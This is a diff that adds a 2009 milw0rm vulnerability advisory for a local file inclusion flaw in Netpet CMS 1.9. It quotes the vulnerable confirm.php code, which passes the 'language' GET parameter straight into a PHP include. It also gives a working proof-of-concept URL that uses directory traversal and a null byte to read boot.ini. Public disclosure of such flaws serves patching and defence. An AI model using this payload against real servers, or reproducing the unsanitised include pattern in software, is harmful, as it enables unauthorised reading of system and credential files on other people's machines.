@@ -1,0 +1,26 @@
+############################################################################################
+[+] Netpet CMS 1.9 (confirm.php language) Local File Inclusion Vulnerability
+[+] Discovered By SirGod
+[+] http://insecurity-ro.org
+[+] http://h4cky0u.org
+############################################################################################
+
+[+] Download : http://www.netpet.at/en/downloads
+
+[+] Local File Inclusion
+
+  - Vulnerable code in netpet/confirm.php
+
+------------------------------------------------------------------------
+$selLang = $_GET['language'];
+if($selLang!=""){
+	include $netpetfolder."netpet/languages/".$selLang.".lang.php";
+------------------------------------------------------------------------
+
+  - PoC
+
+   http://127.0.0.1/[path]/netpet/confirm.php?language=../../../../../../../boot.ini%00
+
+############################################################################################
+
+# milw0rm.com [2009-08-03]
